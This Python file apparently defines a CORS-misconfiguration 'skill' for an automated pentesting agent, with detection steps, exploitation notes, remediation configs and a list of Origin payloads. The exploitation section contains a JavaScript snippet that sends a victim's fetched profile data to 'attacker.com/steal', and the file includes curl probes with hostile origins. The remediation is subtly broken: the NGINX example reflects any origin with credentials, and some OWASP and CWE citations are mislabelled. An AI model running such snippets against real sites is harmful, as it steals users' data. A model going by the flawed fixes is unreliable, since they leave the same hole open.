"""
CORS Misconfiguration Skill - Detect and exploit insecure cross-origin policies
"""

SKILL = {
    "id": "cors_misconfig",
    "name": "CORS Misconfiguration",
    "category": "web",
    "severity": "high",

    "detection": """
1. Scan all HTTP responses for CORS headers using http_headers_check:
   - Access-Control-Allow-Origin
   - Access-Control-Allow-Credentials
   - Access-Control-Allow-Methods
   - Access-Control-Allow-Headers

2. Test with multiple Origin header values:
   - arbitrary.attacker.com (should be rejected, but may be allowed)
   - null (if Access-Control-Allow-Credentials: true + null = data leak)
   - https://targetsite.com.attacker.com (domain suffix manipulation)
   - https://targetsite.com (legitimate subdomain for baseline)

3. Signs of misconfiguration:
   - Access-Control-Allow-Origin: * (wildcard with credentials)
   - Access-Control-Allow-Origin: * + Access-Control-Allow-Credentials: true
   - Regex-based origin validation that is bypassable (e.g., .*targetsite.com.*)
   - Echoing client-supplied Origin header without validation
   - Access-Control-Allow-Headers: * (allows any header)
   - Access-Control-Allow-Methods: * (allows any HTTP method)

4. Test both pre-flight (OPTIONS) and actual requests (GET/POST/PUT/DELETE)
""",

    "exploitation": """
1. Credential-based theft via XSS on attacker domain:
   ```javascript
   // attacker.com script, runs in victim's browser if they visit attacker.com
   // Target application responds with Access-Control-Allow-Origin: * + credentials
   fetch('https://target.com/api/user/profile', {
       method: 'GET',
       credentials: 'include'  // Include victim's cookies
   })
   .then(r => r.json())
   .then(data => {
       // data now contains victim's profile (email, name, ID, etc)
       fetch('https://attacker.com/steal?data=' + JSON.stringify(data));
   });
   ```

2. Session hijacking via CORS + CSRF:
   - Use CORS to read CSRF token from GET request to /csrf-token
   - Use that token to make authenticated POST request
   - Example: POST to /api/transfer-money with victim's authorization

3. Data exfiltration from authenticated endpoints:
   - If Access-Control-Allow-Credentials: true without proper origin check
   - Fetch /api/users (list all users with emails)
   - Fetch /api/sensitive-data
   - Fetch /api/admin/reports

4. Test with attacker-controlled origin header:
   - curl -H "Origin: https://attacker.com" https://target.com/api/data -i
   - Look for: Access-Control-Allow-Origin: https://attacker.com (reflected/vulnerable)
   - If vulnerable, demonstrate data theft with PoC HTML

5. Null origin bypass:
   - Some apps allow origin: null (sandboxed iframe, data: URL)
   - Test: curl -H "Origin: null" https://target.com/api/data -i
   - If Access-Control-Allow-Origin: null returned, it's exploitable

6. Subdomain takeover + CORS combo:
   - If subdomain1.target.com is vulnerable to takeover
   - And target.com allows CORS from *.target.com
   - Attacker takes over subdomain1, serves malicious JS
   - That JS makes requests to target.com API with full access
""",

    "remediation": """
1. IMMEDIATE - Fix CORS headers (all frameworks):

   NGINX:
   ```nginx
   add_header 'Access-Control-Allow-Origin' '$http_origin' always;
   add_header 'Access-Control-Allow-Credentials' 'true' always;
   add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS' always;
   add_header 'Access-Control-Allow-Headers' 'Content-Type, Authorization' always;

   # Only allow specific origins, never *
   if ($http_origin = 'https://trusted-domain.com') {
       set $allow_origin $http_origin;
   }
   add_header 'Access-Control-Allow-Origin' $allow_origin always;
   ```

   Apache:
   ```apache
   <IfModule mod_headers.c>
       Header always set Access-Control-Allow-Origin "https://trusted-domain.com"
       Header always set Access-Control-Allow-Methods "GET, POST, OPTIONS"
       Header always set Access-Control-Allow-Headers "Content-Type, Authorization"
       Header always set Access-Control-Allow-Credentials "true"
   </IfModule>
   ```

   Express.js:
   ```javascript
   const cors = require('cors');
   const whitelist = ['https://trusted-domain.com', 'https://app.trusted-domain.com'];

   app.use(cors({
       origin: function(origin, callback) {
           if (whitelist.indexOf(origin) !== -1 || !origin) {
               callback(null, true);
           } else {
               callback(new Error('Not allowed by CORS'));
           }
       },
       credentials: true,
       methods: ['GET', 'POST', 'OPTIONS'],
       allowedHeaders: ['Content-Type', 'Authorization']
   }));
   ```

   Django:
   ```python
   CORS_ALLOWED_ORIGINS = [
       "https://trusted-domain.com",
       "https://app.trusted-domain.com",
   ]
   CORS_ALLOW_CREDENTIALS = True
   CORS_ALLOW_METHODS = ['GET', 'POST', 'OPTIONS']
   CORS_ALLOW_HEADERS = ['Content-Type', 'Authorization']
   ```

2. CRITICAL RULES:
   - NEVER use Access-Control-Allow-Origin: *
   - NEVER combine Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true
   - NEVER echo client-supplied Origin header without validation
   - NEVER allow all headers with Access-Control-Allow-Headers: *
   - NEVER allow all methods with Access-Control-Allow-Methods: *

3. LONG-TERM:
   - Maintain strict whitelist of allowed origins (document why each is needed)
   - Use framework CORS libraries (don't implement manually)
   - Implement origin validation regex cautiously (test with invalid origins)
   - For public APIs, consider not setting Access-Control-Allow-Credentials
   - Review CORS config quarterly, remove unused origins

4. VERIFICATION:
   ```bash
   # Test with disallowed origin
   curl -H "Origin: https://evil.com" https://target.com/api/data -i
   # Should NOT return Access-Control-Allow-Origin header

   # Test with allowed origin
   curl -H "Origin: https://trusted.com" https://target.com/api/data -i
   # Should return correct Access-Control-Allow-Origin header

   # Test null origin
   curl -H "Origin: null" https://target.com/api/data -i
   # Should NOT return Access-Control-Allow-Origin: null
   ```

5. Automated testing:
   ```bash
   # Use OWASP tools to validate CORS configuration
   # Or write script to test 20+ origin variations
   ```
""",

    "tools": ["cors_scanner", "http_headers_check", "web_spider"],

    "payloads": [
        "Origin: https://attacker.com",
        "Origin: null",
        "Origin: https://target.com.attacker.com",
        "Origin: https://target.com",
        "Origin: http://localhost:8080",
        "Origin: https://target.com:8443",
        "Origin: https://target.com%00.attacker.com",
        "Origin: https://targetXXXcom",
    ],

    "references": [
        "OWASP A07:2021 - Cross-Origin Resource Sharing (CORS)",
        "CWE-942 - Permissive Cross-Domain Policy",
        "CWE-520 - Improper Access Control",
        "https://owasp.org/www-community/attacks/abuse_of_cors",
        "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Origin_Resource_Sharing_Cheat_Sheet.html",
    ],
}
